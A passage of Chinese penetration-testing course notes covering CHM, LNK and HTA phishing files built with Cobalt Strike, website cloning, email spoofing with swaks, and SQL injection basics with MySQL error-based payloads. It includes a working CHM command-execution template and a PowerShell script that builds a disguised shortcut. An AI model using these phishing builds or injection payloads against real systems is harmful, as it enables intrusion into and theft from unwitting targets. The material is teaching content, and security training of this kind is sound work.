start="3"><li>制作过程</li></ol><ul><li>首先创建一个根目录，文件名任意</li><li>在文件内部创建两个目录和一个index.html文件</li><li>两个文件夹内部创建任意文件名的html文件</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">将下列代码复制到index.html文件中</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt; &lt;head&gt; &lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name="Command" value="ShortCut"&gt;</span><br><span class="line">&lt;PARAM name="Button" value="Bitmap::shortcut"&gt;</span><br><span class="line">&lt;PARAM name="ltem1" value=',calc.exe'&gt;</span><br><span class="line">&lt;PARAM name="ltem2" value="273,1,1"&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><ul><li>启动EasyCHM软件</li><li>点击工具栏新建按钮，弹出的对话框中点击浏览按钮，选择创建的根目录，文件类型保持一致，点击确定</li><li>点击工具栏编译按钮，弹出的对话框中点击生成CHM按钮</li></ul><img src="https://pic.imgdb.cn/item/674dcb43d0e0a243d4dc372b.png" style="zoom:67%;"><ol start="4"><li>CS中钓鱼文件生成</li></ol><ul><li>启动Cobalt Strike软件</li><li>点击菜单attasks-&gt;web Drive by-&gt;scripted web Delivery</li><li>弹出的对话框中，type类型设置powershel，单击launch按钮</li><li>用代码将index.html中calc.exe替换</li></ul><p>替换注意问题：</p><p><img src="https://pic.imgdb.cn/item/674dcbdad0e0a243d4dc3761.png"></p><p>示例代码：</p><p><img src="https://pic.imgdb.cn/item/674dcc1dd0e0a243d4dc3773.png"></p><ul><li>主机上线<ul><li>双击运行CHM文件，主机立刻上线</li><li>注意问题：运行执行带有powershell命令的CHM文件，屏幕出现闪现一个黑框</li></ul></li></ul><h5 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h5><ol><li>介绍</li></ol><ul><li>Ink文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</li><li>Ink钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令</li></ul><ol start="2"><li>制作方式</li></ol><ul><li>powershell生成图标</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">代码:</span><br><span class="line">$file = Get-Content "test.txt"</span><br><span class="line">$WshShell=New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut=$WshShell.CreateShortcut("test.Ink")</span><br><span class="line">$Shortcut.TargetPath="%SystemRoot%\system32\cmd.exe"</span><br><span class="line">$Shortcut.lconLocation="%SystemRoot%\System32\Shell32.dll,21</span><br><span class="line">$Shortcut.Arguments =</span><br><span class="line">'+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></tbody></table></figure><ul><li>在生成图标代码文件夹中建立test.txt文件，文件内容<ul><li>cmd /c calc.exe</li></ul></li><li>编译powershell文件内容</li><li>执行生成Ink文件，系统将打开计算器</li></ul><ol start="3"><li>钓鱼方法</li></ol><ul><li>首先Cobalt Strike生成powershell shell代码</li><li>生成方法<ul><li>点击菜单attacks-&gt;web Drive by-&gt;scripted web Delivery</li><li>弹出的对话框中，type类型设置powershell，单击launch按钮</li><li>复制生成代码</li><li>将代码替换test.txt中calc.exe内容</li><li>重新编译powershell代码</li></ul></li></ul><h5 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h5><ol><li>介绍</li></ol><ul><li>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。</li><li>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多,它具有桌面程序的所有权限。</li></ul><ol start="2"><li>CS生成HTA文件</li></ol><ul><li>点击attacks-&gt;packages-&gt;HTML Application</li><li>弹出的对话框中method选择powershel点击generate</li><li>弹出的窗口中选择保存位置，单击确定</li></ul><p><img src="https://pic.imgdb.cn/item/674dceb0d0e0a243d4dc37fd.png"></p><h4 id="3-14-网站克隆和钓鱼邮件"><a href="#3-14-网站克隆和钓鱼邮件" class="headerlink" title="3.14 网站克隆和钓鱼邮件"></a>3.14 网站克隆和钓鱼邮件</h4><h5 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h5><ul><li>复制目标网站前端信息</li><li>构建相似网页</li><li>获取用户登录数据</li></ul><ol><li>方法</li></ol><ul><li>cotalt strike 能够快速复制目标网站前端页面，并且复制相识度极高</li><li>cotalt strike 同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器</li></ul><ol start="2"><li>过程</li></ol><ul><li>点击cobalt strike 主页面Attack-&gt;Web Drive-by-&gt;Clone File</li><li>Clone URL：克隆目标网站的URL</li></ul><p>注意问题：URL需要添加http协议和端口(80)</p><ul><li>Local URL：本地克隆路径</li><li>Local Host：本地主机IP</li><li>Local Port：本地端口</li><li>Attack：克隆后目标网站执行脚本，如：flash漏洞</li></ul><p><img src="https://pic.imgdb.cn/item/674dd012d0e0a243d4dc382f.png"></p><p><img src="https://pic.imgdb.cn/item/674dd06fd0e0a243d4dc3838.png"></p><h5 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h5><ol><li>介绍</li></ol><ul><li>钓鱼邮件指利用<strong>伪装</strong>的电邮，<strong>欺骗</strong>收件人将账号、口令等信息回复给指定的接收者;或引导收件人连接到特制的网页，这些网页通常会伪装成和真实网站一样，如银行或理财的网页，令登录者信以为真，输入信用卡或银行卡号码、账户名称及密码等而被盗取</li></ul><ol start="2"><li>方法</li></ol><ul><li><p>swaks(SWiss Army Knife Smtp) SMTP瑞士军刀</p><ul><li>Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本化，面向事务的SMTP测试工具。可向任意目标发送任意内容的邮件</li><li>kali自带</li><li>官方网站:<a href="http://wwwjetmore.org/john/code/swaks">http://wwwjetmore.org/john/code/swaks</a></li></ul></li><li><p>swaks -to <a href="mailto:xxx@gq.com">xxx@gq.com</a> 测试邮箱连通性</p><ul><li>可以成功发送，但是会被550拦截掉，因为怀疑该邮件大量伪造邮件</li></ul></li><li><p>更换伪造方法</p><ul><li>swaks –to <a href="mailto:xxxx@qq.com">xxxx@qq.com</a> –from <a href="mailto:xxx@126.cn">xxx@126.cn</a> –ehlo <a href="http://www.126.com/">www.126.com</a> –body welcome MissGun –header “Subject: welcome”<ul><li>– to收件人</li><li>–from  发件人</li><li>– ehlo  伪造邮件ehlo头</li><li>– body  发送正文</li><li>–header 邮件头信息 subject:邮件标题</li></ul></li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674dd27fd0e0a243d4dc3861.png"></p><ol start="3"><li>高级用法</li></ol><p><img src="https://pic.imgdb.cn/item/674dd2cbd0e0a243d4dc3867.png"></p><ul><li>swaks –data email.txt –to <a href="mailto:xxx@qq.com">xxx@qq.com</a>  –from <a href="mailto:xx@163.cn">xx@163.cn</a><ul><li>–data 表示邮件原文</li><li>原文中的Received 可以去掉 可以用– from 代替</li><li>原文中的To 也可以去掉，可以用–to代替</li></ul></li></ul><ol start="4"><li>小结</li></ol><ul><li>通过邮件伪造可以发送任意内容，如:重置连接，木马等</li><li>结合网站克隆制作钓鱼网页来进行高级钓鱼策略</li></ul><h2 id="第四章-Web安全漏洞原理与验证"><a href="#第四章-Web安全漏洞原理与验证" class="headerlink" title="第四章 Web安全漏洞原理与验证"></a>第四章 Web安全漏洞原理与验证</h2><h3 id="第一部分-Web安全综述"><a href="#第一部分-Web安全综述" class="headerlink" title="第一部分 Web安全综述"></a>第一部分 Web安全综述</h3><h3 id="第二部分-HTTP协议基础"><a href="#第二部分-HTTP协议基础" class="headerlink" title="第二部分 HTTP协议基础"></a>第二部分 HTTP协议基础</h3><h3 id="第三部分-SQL注入漏洞原理与验证"><a href="#第三部分-SQL注入漏洞原理与验证" class="headerlink" title="第三部分 SQL注入漏洞原理与验证"></a>第三部分 SQL注入漏洞原理与验证</h3><h4 id="4-3-1-数据库基础"><a href="#4-3-1-数据库基础" class="headerlink" title="4.3.1 数据库基础"></a>4.3.1 数据库基础</h4><h5 id="数据库概述"><a href="#数据库概述" class="headerlink" title="数据库概述"></a>数据库概述</h5><ul><li>数据库(DataBase，<strong>DB</strong>)：存储在磁带、磁盘、光盘或其他外存介质上、按一定结构组织在一起的相关数据的集合。</li><li>数据库管理系统(DataBase Management System，<strong>DBMS</strong>)：一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库。例如<strong>MySQL</strong>等类型</li><li>数据库系统(DataBase System，<strong>DBS</strong>):通常由软件、数据库(DB)和数据库管理员组成。软件主要包括操作系统、各种宿主语言、实用程序以及数据库管理系统(DBMS)</li><li>数据库(DB)由数据库管理系统(DBMS)统一管理，数据的插入、修改和检索均要通过数据库管理系统(DBMS)进行。数据库管理员负责创建、监控和维护整个数据库，使数据能被任何有权使用的人有效使用。</li></ul><ol><li>典型的网站体系结构</li></ol><p><img src="https://pic.imgdb.cn/item/674ed6bcd0e0a243d4dcadd2.png"></p><ol start="2"><li>数据库分类</li></ol><ul><li><p>关系型数据库</p><ul><li>关系型数据库模型是把复杂的数据结构归结为简单的二元关系(即二维表格形式)。通过SQL结构化查询语句存储数据，保持数据一致性，遵循ACID理论。</li><li>关系型数据库的典型产品:MySQL、Microsoft SQL Server、Oracle、PostgreSQL、IBM DB2、Access等</li></ul></li><li><p>非关系型数据库</p><ul><li>非关系型数据库也被成为<strong>NOSQL</strong>数据库，NOSQL的本意是“Not Only SQL’指的是非关系型数据库，而不是“NO SQL”的意思。因此，NOSQL的产生并不是要彻底地否定关系型数据库，而是作为传统关系型数据库的一个有效补充。NOSQL数据库在特定的场景下可以发挥出难以想象的高效率和高性能</li><li>非关系型数据库的典型产品:Memcached、<strong>Redis</strong>、<strong>mongoDB</strong>等</li></ul></li></ul><ol start="3"><li>ACID理论</li></ol><ul><li>原子性(Atomicity):事务是一个不可分割的单位，事务中的操作要么都发生，要么都不发生。</li><li>一致性(Consistency):事务前后数据的完整性必须保持一致。</li><li>隔离性(lsolation):多个用户并发访问数据库时，数据库为每一个用户开启的事务，不能被其他事务的操作数据所干扰，多个并发事务之间要相互隔离。</li><li>持久性(Durability):一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来即使数据库发生故障也不应该对其有任何影响。</li></ul><h6 id="主流数据库管理系统"><a href="#主流数据库管理系统" class="headerlink" title="主流数据库管理系统"></a>主流数据库管理系统</h6><ol><li>Oracle</li></ol><ul><li>甲骨文公司的一款关系型数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle是目前世界上功能最强大、最复杂、市场占比最高的商业数据库产品，适用于各类大、中、小、微机环境。它是一种高效率、**<u>可靠性好的适应高吞吐量</u>**的数据库解决方案。</li><li>从架构到运维，可以说是最难的数据库，学习和使用难度较高。</li></ul><ol start="2"><li>MySQL</li></ol><ul><li>MySQL是当今最受欢迎的开源SQL数据库管理系统，它由瑞典MySQLAB开发、发布和支持。MySQL AB是一家基于MySQL开发人员的商业公司，它是一家使用了一种成功的商业模式来结合开源价值和方法论的第二代开源公司。</li><li>MySQL是现在非常流行的关系型数据库管理系统，尤其在**<u>Web应用方面</u>**，是最好的关系型数据库管理系统应用软件之一。</li></ul><ol start="3"><li>Microsoft sQL Server(MssQL)</li></ol><ul><li>SQL Server 是Microsoft推出的关系型数据库管理系统，具有使用方便**<u>可伸缩性好与相关软件集成程度高</u>**等优点，从旧版本的个人电脑到运行Microsoft Windows server 的大型多处理器的服务器都可以使用,</li><li>老版本只能在Windows上运行，从SQLServer2017版本起可以在Linux上运</li></ul><ol start="4"><li>PostgresQL</li></ol><ul><li>PostgreSQL是加州大学伯克利分校计算机系开发的开源对象关系型数据库管理系统(ORDBMS)，**<u>稳定性极强，用于安全地存储数据</u>**</li></ul><ol start="5"><li>Memcached</li></ol><ul><li>Memcached是一个开源的、高性能的、具有分布式内存对象的<strong>缓存系统</strong>。通过它<u><strong>可以减轻数据库负载，加速动态的Web应用</strong></u>。目前全球有非常多的用户都在使用它来架构主机的大负载网站或提升主机的高访问网站的响应速度</li><li>Memcached是一种纯内存缓存系统，把经常存取的对象或数据缓存在Memcached的内存中，这些缓存的数据被程序通过API的方式进行读取，Memcached里面的数据就像一张巨大的hash表，数据以<strong>key-value对</strong>的方式存在</li></ul><ol start="6"><li>Redis</li></ol><ul><li>Redis也是一个key-value型存储系统。但Redis支持的存储value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)等。这些数据类型都支持push/pop、add/remove及取交集、并集和差集及更丰富的操作。</li></ul><ol start="7"><li>mongoDB</li></ol><ul><li>mongoDB是一个基于分布式文件存储的数据库，由C++语言编写，旨在为Web应用提供可扩展的高性能数据存储解决方案。</li><li>mongoDB是一个<strong>介于关系型数据库和非关系型数据库之间</strong>的产品，是非关系型数据库当中功能最丰富，最像关系型数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。</li><li>mongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</li></ul><h6 id="国内自主研发的关系型数据库"><a href="#国内自主研发的关系型数据库" class="headerlink" title="国内自主研发的关系型数据库"></a>国内自主研发的关系型数据库</h6><ul><li>达梦(DM)：由华中理工冯玉才教授创办，完全自主研发，以Oracle为参照、追赶对象。</li><li>人大金仓(Kingbase)：由人民大学王珊教授创办，自主研发。普通的关系型数据库。</li><li>神舟通用(OSCAR)：神舟集团与南大通用合作开发的关系型数据库，更多地用于数据分析领域。</li><li>南大通用(GBase)：南开大学的背景，2010年左右自主研发的基于列式存储、面向数据分析、数据仓库的数据库系统。</li></ul><h6 id="MYSQL数据库连接方式"><a href="#MYSQL数据库连接方式" class="headerlink" title="MYSQL数据库连接方式"></a>MYSQL数据库连接方式</h6><ul><li>命令行连接：[root@host]#mysql -h XXXX-u root -p</li><li>PHP脚本连接:mysqli_connect(host,username,password,dbname,port,socket);</li><li>第三方软件连接</li></ul><h5 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h5><h6 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h6><ul><li>盲跟踪<ul><li>Web应用技术</li><li>不同数据库SQL语句差异</li></ul></li><li>非盲跟踪<ul><li>报错、直接查询</li></ul></li></ul><h6 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h6><ol><li>默认端口号</li></ol><ul><li>Oracle:1521</li><li>MySQL:3306</li><li>SQL Server:1433</li><li>PostgresQL: 5432</li><li>mongoDB:27017</li><li>Redis:6379</li><li>MemcacheDB:11211</li></ul><ol start="2"><li>报错信息</li></ol><p><img src="https://pic.imgdb.cn/item/674edf11d0e0a243d4dcb6eb.png"></p><ol start="3"><li>各数据库的版本查询方法区别</li></ol><ul><li><p>MSSQLselect @@version只可以运行这条就为MSSQL</p></li><li><p>MySQL    select version() / select @@version两条都能运行就为MySQL</p></li><li><p>Oracle     select banner from v$version只可以运行这条就为Oracle</p></li><li><p>PostgreSQL     select version()只可以运行这条就为PostgreSQL</p></li></ul><ol start="4"><li>各数据库在字符串处理时的区别</li></ol><p><img src="https://pic.imgdb.cn/item/674ee0cad0e0a243d4dcba50.png"></p><ol start="5"><li>各数据库与网页编程语言的搭配</li></ol><p>常见的搭配:</p><ul><li>ASP和.NET: Microsoft SQL Server</li><li>PHP: MySQL、PostgreSQL</li><li>Java: Oracle、MySQL</li></ul><h5 id="SQL语句基础"><a href="#SQL语句基础" class="headerlink" title="SQL语句基础"></a>SQL语句基础</h5><p><img src="https://pic.imgdb.cn/item/674ee1afd0e0a243d4dcbc01.png"></p><ol><li>用于与关系型数据库交互的标准 SQL 命令有</li></ol><ul><li>CREATE、SELECT、INSERT、 UPDATE、DELETE 和DROP</li><li>分为三组<ul><li>数据定义(Create、Drop)</li><li>数据操纵(Select、Insert、Update、Delete)</li><li>数据控制(Grant、Revoke)</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674ee2afd0e0a243d4dcbdac.png"></p><ol start="2"><li>高级操作</li></ol><p><img src="https://pic.imgdb.cn/item/674ee578d0e0a243d4dcc22f.png"></p><p><img src="https://pic.imgdb.cn/item/674ee786d0e0a243d4dcc670.png"></p><p>order by 3：按照第3列排序</p><p>超出列数，报错</p><p><img src="https://pic.imgdb.cn/item/674ee706d0e0a243d4dcc54d.png"></p><p><img src="https://pic.imgdb.cn/item/674ee7cdd0e0a243d4dcc719.png"></p><p><img src="https://pic.imgdb.cn/item/674f1476d0e0a243d4dcde5e.png"></p><p><img src="https://pic.imgdb.cn/item/674f17fcd0e0a243d4dcdf27.png"></p><p><img src="https://pic.imgdb.cn/item/674f1819d0e0a243d4dcdf2c.png"></p><ul><li><p>union select 查询到结果会直接拼接到查询结果的下面</p></li><li><p>前面的select的字段数要和后面union select的字段数相同</p></li></ul><p><img src="https://pic.imgdb.cn/item/674f1a88d0e0a243d4dcdfa8.png"></p><p><img src="https://pic.imgdb.cn/item/674f1aabd0e0a243d4dcdfb0.png"></p><p><img src="https://pic.imgdb.cn/item/674f1adbd0e0a243d4dcdfbb.png"></p><p><img src="https://pic.imgdb.cn/item/674f1bcad0e0a243d4dcdfe9.png"></p><p><img src="https://pic.imgdb.cn/item/674f1bded0e0a243d4dcdfeb.png"></p><p><img src="https://pic.imgdb.cn/item/674f1cadd0e0a243d4dcdffe.png"></p><h4 id="4-3-2-SQL注入漏洞利用"><a href="#4-3-2-SQL注入漏洞利用" class="headerlink" title="4.3.2 SQL注入漏洞利用"></a>4.3.2 SQL注入漏洞利用</h4><h5 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h5><p>​攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后台数据库乃至整个应用系统的入侵</p><ol><li>SQL注入原理</li></ol><p>​服务端没有过滤用户输入的恶意数据，直接把用户输入的数据当做SQL语句执行，从而影响数据库安全和平台安全。</p><ul><li>两个条件<ul><li>用户能够控制输入</li><li>原本程序要执行的SQL语句，拼接了用户输入的恶意数据</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674f1ec7d0e0a243d4dce08a.png"></p><ol start="2"><li>SQL注入带来的危害</li></ol><ul><li>绕过登录验证：使用万能密码登录网站后台等</li><li>获取敏感数据：获取网站管理员帐号、密码等</li><li>文件系统操作：列目录，读取、写入文件等</li><li>注册表操作：读取、写入、删除注册表等</li><li>执行系统命令：远程执行命令</li></ul><ol start="3"><li>万能密码</li></ol><p><img src="https://pic.imgdb.cn/item/674f1f79d0e0a243d4dce0af.png"></p><p><img src="https://pic.imgdb.cn/item/674f2065d0e0a243d4dce0cb.png"></p><h5 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h5><ol><li>按照注入点类型分类</li></ol><ul><li><p>数字型(整型)注入</p></li><li><p>字符型注入</p></li><li><p>搜索型注入</p></li><li><p>数字型(整型)注入</p></li></ul><p><img src="https://pic.imgdb.cn/item/674f211cd0e0a243d4dce0ef.png"></p><p><img src="https://pic.imgdb.cn/item/674f2265d0e0a243d4dce117.png"></p><ul><li>字符型注入</li></ul><p><img src="https://pic.imgdb.cn/item/674f2244d0e0a243d4dce114.png"></p><p><img src="https://pic.imgdb.cn/item/674f2328d0e0a243d4dce132.png"></p><ul><li>搜索型注入</li></ul><p><img src="https://pic.imgdb.cn/item/674f234ad0e0a243d4dce137.png"></p><ol start="2"><li>按照注入技术(执行效果)分类</li></ol><ul><li>基于布尔的盲注<ul><li>可以根据返回页面判断条件真假的注入</li></ul></li><li>基于时间的盲注<ul><li>不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断</li></ul></li><li>基于报错的注入<ul><li>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li></ul></li><li>联合查询注入<ul><li>可以使用union的情况下的注入</li></ul></li><li>堆查询注入<ul><li>同时执行多条语句的注入</li></ul></li></ul><h5 id="SQL注入漏洞形成的原因"><a href="#SQL注入漏洞形成的原因" class="headerlink" title="SQL注入漏洞形成的原因"></a>SQL注入漏洞形成的原因</h5><ol><li>动态字符串构建引起</li></ol><ul><li>不正确的处理转义字符(宽字节注入)：数据库为GBK编码为两个字节，%df和\刚好两字节组成一个汉字，可以吞掉转义闭合符的’’\‘’</li><li>不正确的处理错误(报错泄露信息)</li><li>不正确的处理联合查询</li><li>不正确的处理多次提交(二次注入)</li></ul><ol start="2"><li>后台存在的问题</li></ol><ul><li>后台无过滤或者编码用户数据</li><li>数据库可以拼接用户传递的恶意代码</li></ul><ol start="3"><li>错误处理不当</li></ol><ul><li>详细的内部错误消息显示给用户或攻击者</li><li>错误信息可以直接给攻击者提供下一步攻击帮助</li></ul><ol start="4"><li>不安全的数据库配置</li></ol><ul><li><p>默认账户:<br>  SQL Server “sa” 作为数据库系统管理员账户;<strong>默认账户名不可修改</strong><br>  MySQL使用 “root” 和 “anonymous” 用户账户;<br>  Oracle则在创建数据库时通常默认会创建SYS、SYSTEMS DBSNMP和OUTLN账户</p></li><li><p>权限<br>  问题:系统和数据库管理员在安装数据库服务器时允许以roots SYSTEM或Administrator特<br>  权系统用户账户身份执行操作。<br>  正确方法:应该始终以普通用户身份运行服务器上的服务，降低用户权限，将用户权限只限于<br>  本服务。</p></li></ul><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><ol><li>GET</li></ol><ul><li>GET方法<ul><li>一种请求服务器的HTTP方法，使用该方法时，信息包含在URL中</li><li>点击一个链接时，一般会使用该方法</li></ul></li><li>GET请求方法的格式<br>  ?text=value1&amp;cat=value2&amp;num=value3..</li><li>修改方法<ul><li>浏览器的导航栏中直接修改即可操纵这些参数</li><li>HackBar插件</li></ul></li></ul><ol start="2"><li>POST</li></ol><ul><li><p>POST是一种用于向Web服务器发送信息的HTTP方法</p></li><li><p>数据信息无法在URL中看到</p></li><li><p>可以发送字节大的数据</p></li><li><p>修改POST包方法</p><ul><li>浏览器修改扩展(Hackbar)</li><li>代理服务器(Burpsuite)</li></ul></li></ul><ol start="3"><li>其它注入点数据</li></ol><ul><li>Cookie</li><li>Host</li><li>User-Agent</li></ul><h5 id="SQL注入的过程"><a href="#SQL注入的过程" class="headerlink" title="SQL注入的过程"></a>SQL注入的过程</h5><ol><li>手工注入过程</li></ol><p>（1）判断是否存在注入点<br>（2）判断字段长度(字段数)<br>（3）判断字段回显位置<br>（4）判断数据库信息<br>（5）查找数据库名<br>（6）查找数据库表<br>（7）查找数据库表中所有字段以及字段<br>（8）猜解账号密码<br>（9）登录管理员后台。</p><ol start="2"><li>自动化注入工具</li></ol><p>（1）SQL注入工具</p><ul><li>Sqlmap</li><li>Havij</li><li>sqlid</li></ul><p>（2）ASP/JSP注入工具</p><ul><li>NBSI</li><li>阿D注入软件</li><li>明小子注入软件</li></ul><p>（3）PHP注入工具</p><ul><li>海阳顶端注入软件</li><li>穿山甲注入软件</li></ul><h4 id="4-3-3-SQL报错注入"><a href="#4-3-3-SQL报错注入" class="headerlink" title="4.3.3 SQL报错注入"></a>4.3.3 SQL报错注入</h4><h5 id="SQL报错注入概述"><a href="#SQL报错注入概述" class="headerlink" title="SQL报错注入概述"></a>SQL报错注入概述</h5><ol><li>报错注入</li></ol><p>​通过构造特定的SQL语句，让攻击者想要査询的信息(如数据库名、版本号、用户名等)通过页面的错误提示回显出来</p><ol start="2"><li>报错注入的前提条件</li></ol><ul><li>Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上</li><li>后台未对一些具有报错功能的函数(如extractvalue、updatexml等)进行过滤</li></ul><img src="https://pic.imgdb.cn/item/67510a3cd0e0a243d4dda4b9.png" style="zoom:67%;"><p>上图为数据库报错函数，extractvalue、updatexml的报错信息，可以通过mysql_error函数显示出来</p><ol start="3"><li>有报错功能的函数</li></ol><ul><li><p>Xpath类型函数(MySQL数据库版本号&gt;=5.1.5)</p><ul><li><p><u><strong>extractvalue()</strong></u></p><ul><li>作用：<strong>对XML文档进行查询</strong>，相当于在HTML文件中用标签查找元素。</li><li>语法：extractvalue(XML_document, XPath_string )<br>      参数1：XML_document是String格式，为XML文档对象的名称<br>      参数2：<strong>XPath_string</strong>(Xpath格式的字符串)，注入时可操作的地方</li><li>报错原理：xml文档中查找字符位置是用 /xxx/xxx/xxx/..这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：<strong>XPATH syntax error</strong>:’xxxxxxxx’</li><li>实例<br>  mysql&gt; select <u>extractvalue</u>(1,concat(‘<del>‘,<strong>user()</strong>));<br>  ERROR 1105 (HY000):XPATH syntax error:’</del><strong>root@localhost</strong>‘</li><li>注：该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</li></ul></li><li><p><u><strong>updatexml()</strong></u></p><ul><li>作用：<strong>改变文档中符合条件的节点的值</strong>。</li><li>语法：updatexml( XML_document, XPath_string, new_value )<br>      参数1：XML_document是String格式，为XML文档对象的名称<br>      参数2：<strong>XPath_string</strong> (Xpath格式的字符串)，注入时可操作的地方<br>      参数3：new_value，String格式，替换查找到的符合条件的数据</li><li>报错原理：同extractvalue()</li><li>实例<br>  mysql&gt; select <u>updatexml</u>(1,concat(‘<del>‘,<strong>user()</strong>),1);<br>  ERROR 1105 (HY000)：XPATH syntax error:’</del><strong>root@localhost</strong>‘</li><li>注：该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</li></ul></li></ul></li><li><p>其他函数</p><ul><li><u><strong>floor()、rand()、count()、group by联用</strong></u><ul><li>作用<ul><li>floor(x)：对参数x向下取整</li><li>rand()：生成一个0~1之间的随机浮点数</li><li>count(*)：统计某个表下总共有多少条记录*</li><li>group by x：按照(by)一定的规则(x)进行分组</li></ul></li><li>报错原理：qroup by与rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由qroup by将计算出来的主键直接插入到临时表格中，导致<strong>主键重复报错</strong>，错误信息如：<strong>Duplicate entry</strong> ‘… ‘<strong>for key’group key’</strong><br>  (参考资料:<a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a>)</li><li>实例<br>  mysql&gt; select 1 from (select count(*),concat(<strong>user()</strong>,floor(rand(0)*2))x from information_schema.tables group by x)a;<br>  ERROR 1062 (23000): Duplicate entry ‘<strong>root@localhost</strong>1’ for key ‘group key’</li></ul></li><li><strong><u>exp()</u></strong>       (5.5.5&lt;= MySQL数据库版本号 &lt;=5.5.49)<ul><li>作用：计算以e(自然常数)为底的幂值</li><li>语法：exp(x)</li><li>报错原理:当参数x超过710时，exp()函数会报错，错误信息如：<strong>DOUBLE value is out of range</strong>:<br>  ……</li><li>实例<br>  mysql&gt; select <u>exp</u>(<del>(select * from (select <strong>user()</strong>) as x));<br>  ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘<strong>root@localhost</strong>‘ from dual)</li></ul></li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/67511433d0e0a243d4ddb678.png"></p><h5 id="SQL报错注入实例"><a href="#SQL报错注入实例" class="headerlink" title="SQL报错注入实例"></a>SQL报错注入实例</h5><p><img src="https://pic.imgdb.cn/item/67511486d0e0a243d4ddb708.png"></p><p><img src="https://pic.imgdb.cn/item/67511947d0e0a243d4ddbcec.png"></p><p><img src="https://pic.imgdb.cn/item/675119d6d0e0a243d4ddbd78.png"></p><h4 id="4-3-4-SQL盲注"><a href="#4-3-4-SQL盲注" class="headerlink" title="4.3.4 SQL盲注"></a>4.3.4 SQL盲注</h4><h5 id="SQL盲注概述"><a href="#SQL盲注概述" class="headerlink" title="SQL盲注概述"></a>SQL盲注概述</h5><ol><li>盲注</li></ol><ul><li>在SQL注入过程中，SQL语句执行后，选择的数据<strong>不能回显</strong>到前端页面，此时需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</li><li>在盲注中，攻击者根据其返回页面的不同来判断信息(可能是页面内容的不同，也可以是响应时间不同)。一般情况下，盲注可分为两类:<ul><li>基于布尔的盲注(Boolean based)</li><li>基于时间的盲注(Time based)</li></ul></li></ul><ol start="2"><li>盲注分为两种</li></ol><ul><li>基于布尔的盲注<br>  某些场合下，页面返回的结果只有两种(正常或错误)。通过构造SQL判断语句，查看页面的返回结果(True or False)来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。</li><li>基于时间的盲注<br>  